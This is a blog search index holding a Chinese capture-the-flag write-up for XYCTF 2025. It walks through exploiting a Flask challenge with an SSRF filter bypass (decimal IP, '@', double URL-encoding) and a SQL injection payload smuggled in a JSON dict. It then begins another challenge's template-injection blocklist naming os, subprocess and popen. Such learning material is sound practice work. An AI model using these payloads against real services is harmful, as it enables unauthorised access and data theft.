<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XYCTF 2025</title>
      <link href="/CTFwp/XYCTF-2025/"/>
      <url>/CTFwp/XYCTF-2025/</url>
      
        <content type="html"><![CDATA[<h2 id="Fate"><a href="#Fate" class="headerlink" title="Fate"></a>Fate</h2><h3 id="闲话"><a href="#闲话" class="headerlink" title="闲话"></a>闲话</h3><p>这道题不足的地方：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">setText</span>(<span class="params">text</span>) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;result&quot;</span>).<span class="property">innerText</span> = <span class="string">`=&gt; <span class="subst">$&#123;text&#125;</span>`</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">queryPerson</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> name = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;name&quot;</span>).<span class="property">value</span>;</span><br><span class="line">    <span class="title function_">fetch</span>(<span class="string">&#x27;/1337&#x27;</span>, &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;GET&#x27;</span>,  <span class="comment">// 传json格式的数据，用POST，这里代码有问题了。</span></span><br><span class="line">        <span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>&#125;,</span><br><span class="line">        <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;name&#125;)</span><br><span class="line">    &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">response</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (response.<span class="property">status</span> !== <span class="number">200</span>) &#123;</span><br><span class="line">            <span class="title function_">setText</span>(<span class="string">&quot;Error, Maybe the person name is too long or not valid, and this service is only accessiblke to local users&quot;</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(response.<span class="property">statusText</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> response.<span class="title function_">json</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;).<span class="title function_">then</span>(<span class="function"><span class="params">data</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="title function_">setText</span>(data.<span class="property">Fate</span>);</span><br><span class="line">    &#125;).<span class="title function_">catch</span>(<span class="function"><span class="params">err</span> =&gt;</span> &#123;&#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入&#x2F;1337路由：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/1337&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>) </span><span class="comment"># 这里接收的时候也用的应该是POST。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_search</span>():</span><br></pre></td></tr></table></figure><p>最重要的一点：这些代码错误了，而且和题目没有关系，&#x2F;路由真的没必要写，而且这还会被喷。</p><h3 id="代码审计环节"><a href="#代码审计环节" class="headerlink" title="代码审计环节"></a>代码审计环节</h3><p>我更改了一下代码，先在本地复现，进行代码审计：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/1337&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">api_search</span>():</span><br><span class="line">    <span class="keyword">if</span> flask.request.remote_addr == <span class="string">&#x27;127.0.0.1&#x27;</span>: <span class="comment"># 这里必须为 本机访问/1337路由</span></span><br><span class="line">        code = flask.request.args.get(<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> code == <span class="string">&#x27;abcdefghi&#x27;</span>:</span><br><span class="line">            req = flask.request.args.get(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                req = binary_to_string(req) <span class="comment"># 跟进 binary_to_string 函数。</span></span><br><span class="line">                <span class="built_in">print</span>(req)</span><br><span class="line">                req = json.loads(req) <span class="comment"># No one can hack it, right? Pickle unserialize is not secure, but json is ;) json解码</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Invalid JSON&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;name&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> req:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Empty Person&#x27;s name&quot;</span>)</span><br><span class="line"></span><br><span class="line">            name = req[<span class="string">&#x27;name&#x27;</span>] <span class="comment"># 这一步说明我们要传入 &#123;&#x27;name&#x27;:&#125;格式的内容</span></span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(name) &gt; <span class="number">6</span>: <span class="comment"># name的长度要小于6了。</span></span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;Too long&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;\&#x27;&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;NO &#x27;&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;)&#x27;</span> <span class="keyword">in</span> name:</span><br><span class="line">                flask.abort(<span class="number">400</span>, <span class="string">&quot;NO )&quot;</span>)</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            Some waf hidden here ;)</span></span><br><span class="line"><span class="string">            &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">            fate = db_search(name) <span class="comment"># 跟进db_search 函数</span></span><br><span class="line">            <span class="keyword">if</span> fate <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                flask.abort(<span class="number">404</span>, <span class="string">&quot;No such Person&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&#x27;Fate&#x27;</span>: fate&#125;</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flask.abort(<span class="number">400</span>, <span class="string">&quot;Hello local, and hello hacker&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flask.abort(<span class="number">403</span>, <span class="string">&quot;Only local access allowed&quot;</span>)</span><br></pre></td></tr></table></figure><p>binary_to_string函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">binary_to_string</span>(<span class="params">binary_string</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(binary_string) % <span class="number">8</span> != <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;Binary string length must be a multiple of 8&quot;</span>)</span><br><span class="line">        <span class="comment"># 要求binary_string 必须是 8 的 倍数。</span></span><br><span class="line">    binary_chunks = [binary_string[i:i+<span class="number">8</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(binary_string), <span class="number">8</span>)]</span><br><span class="line">    <span class="comment"># 按 8 位 分一组</span></span><br><span class="line">    string_output = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(<span class="built_in">int</span>(chunk, <span class="number">2</span>)) <span class="keyword">for</span> chunk <span class="keyword">in</span> binary_chunks)</span><br><span class="line">    <span class="comment"># 先将8位二进制数据转化为10进制，再转化为字符，最后进行拼接。</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> string_output</span><br></pre></td></tr></table></figure><p>反过来，我们输入的payload必须转化为二进制数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;&#123;&quot;name&quot;:&quot;JANE&quot;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">array = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    a = <span class="built_in">format</span>(<span class="built_in">ord</span>(i),<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a) &lt; <span class="number">8</span>:</span><br><span class="line">        a=(<span class="number">8</span>-<span class="built_in">len</span>(a))*<span class="string">&#x27;0&#x27;</span>+a</span><br><span class="line">    array.append(a)</span><br><span class="line"></span><br><span class="line">b = <span class="string">&#x27;&#x27;</span>.join(array)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"><span class="comment"># 回退到原来的位置。</span></span><br></pre></td></tr></table></figure><p>db_search函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">db_search</span>(<span class="params">code</span>):</span><br><span class="line">    <span class="keyword">with</span> sqlite3.connect(<span class="string">&#x27;database.db&#x27;</span>) <span class="keyword">as</span> conn:</span><br><span class="line">        cur = conn.cursor() <span class="comment"># 查询之前，必须要有游标。</span></span><br><span class="line">        cur.execute(<span class="string">f&quot;SELECT FATE FROM FATETABLE WHERE NAME=UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(UPPER(&#x27;<span class="subst">&#123;code&#125;</span>&#x27;)))))))&quot;</span>) </span><br><span class="line">        <span class="comment"># UPPER() 函数 用于将字符串转化为大写。</span></span><br><span class="line">        found = cur.fetchone() <span class="comment"># 获取结果行。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span> <span class="keyword">if</span> found <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> found[<span class="number">0</span>] <span class="comment"># 返回查询结果</span></span><br></pre></td></tr></table></figure><p>总结：&#x2F;1337路由，主要用于查询数据库的信息。</p><p>&#x2F;proxy路由：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">blacklist = string.ascii_letters <span class="comment">#所有大小写字母</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nolettersproxy</span>():</span><br><span class="line">    url = flask.request.args.get(<span class="string">&#x27;url&#x27;</span>) <span class="comment"># 获取url，会解析一次(进行一次url解码)。</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">400</span>, <span class="string">&#x27;No URL provided&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    target_url = <span class="string">&quot;http://lamentxu.top&quot;</span> + url <span class="comment"># 网址拼接</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist: <span class="comment"># 禁用了 a-z A-Z</span></span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> url:</span><br><span class="line">            <span class="keyword">return</span> flask.abort(<span class="number">403</span>, <span class="string">&#x27;I blacklist the whole alphabet, hiahiahiahiahiahiahia~~~~~~&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;.&quot;</span> <span class="keyword">in</span> url: <span class="comment"># 禁用了 . </span></span><br><span class="line">        <span class="keyword">return</span> flask.abort(<span class="number">403</span>, <span class="string">&#x27;No ssrf allowed&#x27;</span>) </span><br><span class="line">    response = requests.get(target_url) <span class="comment"># 这里发起了一个请求</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> flask.Response(response.content, response.status_code)</span><br></pre></td></tr></table></figure><img src="/CTFwp/XYCTF-2025/image-20250727205836110.png" class="" title="image-20250727205836110"><p>init_db.py文件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line"></span><br><span class="line">conn = sqlite3.connect(<span class="string">&quot;database.db&quot;</span>) </span><br><span class="line">conn.execute(<span class="string">&quot;&quot;&quot;CREATE TABLE FATETABLE (</span></span><br><span class="line"><span class="string">  NAME TEXT NOT NULL,</span></span><br><span class="line"><span class="string">  FATE TEXT NOT NULL</span></span><br><span class="line"><span class="string">);&quot;&quot;&quot;</span>) <span class="comment"># 创建数据库</span></span><br><span class="line">Fate = [</span><br><span class="line">    (<span class="string">&#x27;JOHN&#x27;</span>, <span class="string">&#x27;1994-2030 Dead in a car accident&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;JANE&#x27;</span>, <span class="string">&#x27;1990-2025 Lost in a fire&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;SARAH&#x27;</span>, <span class="string">&#x27;1982-2017 Fired by a government official&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;DANIEL&#x27;</span>, <span class="string">&#x27;1978-2013 Murdered by a police officer&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;LUKE&#x27;</span>, <span class="string">&#x27;1974-2010 Assassinated by a military officer&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;KAREN&#x27;</span>, <span class="string">&#x27;1970-2006 Fallen from a cliff&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;BRIAN&#x27;</span>, <span class="string">&#x27;1966-2002 Drowned in a river&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;ANNA&#x27;</span>, <span class="string">&#x27;1962-1998 Killed by a bomb&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;JACOB&#x27;</span>, <span class="string">&#x27;1954-1990 Lost in a plane crash&#x27;</span>),</span><br><span class="line">    (<span class="string">&#x27;LAMENTXU&#x27;</span>, <span class="string">r&#x27;2024 Send you a flag flag&#123;FAKE&#125;&#x27;</span>)</span><br><span class="line">]</span><br><span class="line">conn.executemany(<span class="string">&quot;INSERT INTO FATETABLE VALUES (?, ?)&quot;</span>, Fate) <span class="comment"># 将Fate写入到数据库中</span></span><br><span class="line"></span><br><span class="line">conn.commit() <span class="comment"># 保存上面所更改的</span></span><br><span class="line">conn.close() <span class="comment"># 关闭</span></span><br></pre></td></tr></table></figure><p>可以看到，flag在数据库中，但是LAMENTXU的长度大于6，我们不能通过正常地数据库查询得到flag。</p><h3 id="解题环节"><a href="#解题环节" class="headerlink" title="解题环节"></a>解题环节</h3><p>&#x2F;1337路由是len检测name的长度，这里有一个漏洞：len不仅可以输出字符串的长度，还可以输出列表和字典的元素个数，如果我们利用列表或者字典，像下面这种格式就可以绕过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 实际长度已经大于6了</span></span><br><span class="line"><span class="built_in">print</span>([<span class="number">11111111</span>]) <span class="comment"># 输出 1</span></span><br><span class="line"><span class="comment"># 从数字换成字符串就可以。</span></span><br></pre></td></tr></table></figure><p>要访问&#x2F;1337路由，必须从本地回环访问（访问127.0.0.1）。</p><p>在docker-compose.yml，容器端口为：8080。</p><p>我们在&#x2F;proxy路由访问一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proxy?url=@127.0.0.1:8080/1337?0=abcdefghi</span><br></pre></td></tr></table></figure><p>过滤了. ，我们将ip转为数字的就可以，过滤了字母，我们可以进行二次编码，比如url接收到的是<code>%2575</code>，<code>request.args.get(&#39;url&#39;)</code>接收到后，会先解析一次，将%2575解析为%75，这次再进行比较的时候，%75肯定不在[a-zA-Z]中；由于前面有域名，所以我们要用@，@的作用：在进行url解析时，将@之前的当做用户信息，一定要对特殊字符进行url编码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/proxy?url=%402130706433:8080%2F1337%3F0%3D%2561%2562%2563%2564%2565%2566%2567%2568%2569</span><br></pre></td></tr></table></figure><img src="/CTFwp/XYCTF-2025/image-20250728194101623.png" class="" title="image-20250728194101623"><p>确实可以访问。构造payload。</p><p>sql语句如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> FATE <span class="keyword">FROM</span> FATETABLE <span class="keyword">WHERE</span> NAME<span class="operator">=</span><span class="built_in">UPPER</span>(<span class="built_in">UPPER</span>(<span class="built_in">UPPER</span>(<span class="built_in">UPPER</span>(<span class="built_in">UPPER</span>(<span class="built_in">UPPER</span>(<span class="built_in">UPPER</span>(<span class="string">&#x27;&#123;code&#125;&#x27;</span>)))))))</span><br></pre></td></tr></table></figure><p>当where判断为true时，返回FATE。</p><p>payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;\&#x27;))))))) union select FATE from FATETABLE where NAME=\&#x27;LAMENTXU\&#x27;--+&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>刚试了一下，发现数组被过滤了。</p><p>那我们使用字典：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;\&#x27;))))))) union select FATE from FATETABLE where NAME=\&#x27;LAMENTXU\&#x27;--+&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;&#123;&quot;name&quot;:&#123;&quot;\&#x27;))))))) union select FATE from FATETABLE where NAME=\&#x27;LAMENTXU\&#x27;--+&quot;:1&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">array = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    a = <span class="built_in">format</span>(<span class="built_in">ord</span>(i),<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a) &lt; <span class="number">8</span>:</span><br><span class="line">        a=(<span class="number">8</span>-<span class="built_in">len</span>(a))*<span class="string">&#x27;0&#x27;</span>+a</span><br><span class="line">    array.append(a)</span><br><span class="line"></span><br><span class="line">b = <span class="string">&#x27;&#x27;</span>.join(array)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure><img src="/CTFwp/XYCTF-2025/image-20250728200006695.png" class="" title="image-20250728200006695"><p>说一些其他的东西：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(request.remote_addr)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><img src="/CTFwp/XYCTF-2025/image-20250728202802703.png" class="" title="image-20250728202802703"><p>有两个url，我们访问127.0.0.1时，request.remote_addr返回127.0.0.1。访问192.168.0.100时，request.remote_addr返回192.168.0.100。如果代码<code>request.remote_addr == 127.0.0.1</code>，我们要访问的是127.0.0.1:5000。这就是本地回环访问。（<code>request.remote_addr</code> <strong>从 TCP&#x2F;IP 连接层获取</strong>，即直接取与服务器建立连接的客户端 IP）</p><blockquote><p>Fate考察的SSRF , Python的代码审计，sqlite。</p><p>​由于SSRF没学，有一些不自信，代码审计到&#x2F;proxy环节，开启了懦夫模式，我在开启懦夫模式之前，并没有想这个flag到底应该如何获得，flag到底应该从哪里获得，我觉得如果当时能再做的时间长一些，我应该会向这方面思考，事实是当时确实没有思考。</p><p>​这道题虽说有些地方代码没有写好，但是知识点还是可以的，我有学习到新的内容，这道题吃的还是比较透。</p><p>​    没做出来题也没关系，知道自己在哪里卡住了，想想为啥在这里卡住，比如：这里并没有学习；思路没有转过来等等。一定要总结问题了，不然后面遇到了，还是会卡住。</p></blockquote><h2 id="Now-you-see-me-1"><a href="#Now-you-see-me-1" class="headerlink" title="Now you see me 1"></a>Now you see me 1</h2><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>下载源码，在复制的过程中发现还隐藏了一段源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">enable_hook =  <span class="literal">False</span></span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">audit_checker</span>(<span class="params">event,args</span>):</span><br><span class="line">    <span class="keyword">global</span> counter</span><br><span class="line">    <span class="keyword">if</span> enable_hook:</span><br><span class="line">        <span class="keyword">if</span> event <span class="keyword">in</span> [<span class="string">&quot;exec&quot;</span>, <span class="string">&quot;compile&quot;</span>]:</span><br><span class="line">            counter += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> counter &gt; <span class="number">4</span>:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(event)</span><br><span class="line"></span><br><span class="line">lock_within = [</span><br><span class="line">    <span class="string">&quot;debug&quot;</span>, <span class="string">&quot;form&quot;</span>, <span class="string">&quot;args&quot;</span>, <span class="string">&quot;values&quot;</span>, </span><br><span class="line">    <span class="string">&quot;headers&quot;</span>, <span class="string">&quot;json&quot;</span>, <span class="string">&quot;stream&quot;</span>, <span class="string">&quot;environ&quot;</span>,</span><br><span class="line">    <span class="string">&quot;files&quot;</span>, <span class="string">&quot;method&quot;</span>, <span class="string">&quot;cookies&quot;</span>, <span class="string">&quot;application&quot;</span>, </span><br><span class="line">    <span class="string">&#x27;data&#x27;</span>, <span class="string">&#x27;url&#x27;</span> ,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, </span><br><span class="line">    <span class="string">&quot;getattr&quot;</span>, <span class="string">&quot;_&quot;</span>, <span class="string">&quot;&#123;&#123;&quot;</span>, <span class="string">&quot;&#125;&#125;&quot;</span>, </span><br><span class="line">    <span class="string">&quot;[&quot;</span>, <span class="string">&quot;]&quot;</span>, <span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>,<span class="string">&quot;self&quot;</span>, </span><br><span class="line">    <span class="string">&quot;lipsum&quot;</span>, <span class="string">&quot;cycler&quot;</span>, <span class="string">&quot;joiner&quot;</span>, <span class="string">&quot;namespace&quot;</span>, </span><br><span class="line">    <span class="string">&quot;init&quot;</span>, <span class="string">&quot;dir&quot;</span>, <span class="string">&quot;join&quot;</span>, <span class="string">&quot;decode&quot;</span>, </span><br><span class="line">    <span class="string">&quot;batch&quot;</span>, <span class="string">&quot;first&quot;</span>, <span class="string">&quot;last&quot;</span> , </span><br><span class="line">    <span class="string">&quot; &quot;</span>,<span class="string">&quot;dict&quot;</span>,<span class="string">&quot;list&quot;</span>,<span class="string">&quot;g.&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;subprocess&quot;</span>,</span><br><span class="line">    <span class="string">&quot;g|a&quot;</span>, <span class="string">&quot;GLOBALS&quot;</span>, <span class="string">&quot;lower&quot;</span>, <span class="string">&quot;upper&quot;</span>,</span><br><span class="line">    <span class="string">&quot;BUILTINS&quot;</span>, <span class="string">&quot;select&quot;</span>, <span class="string">&quot;WHOAMI&quot;</span>, <span class="string">&quot;path&quot;</span>,</span><br><span class="line">    <span class="string">&quot;os&quot;</span>, <span class="string">&quot;popen&quot;</span>, <span class="string">&quot;cat&quot;</span>, <span class="string">&quot;nl&quot;</span>, <span class="string">&quot;app&quot;</span>, <span class="string">&quot;setattr&quot;</span>, <span 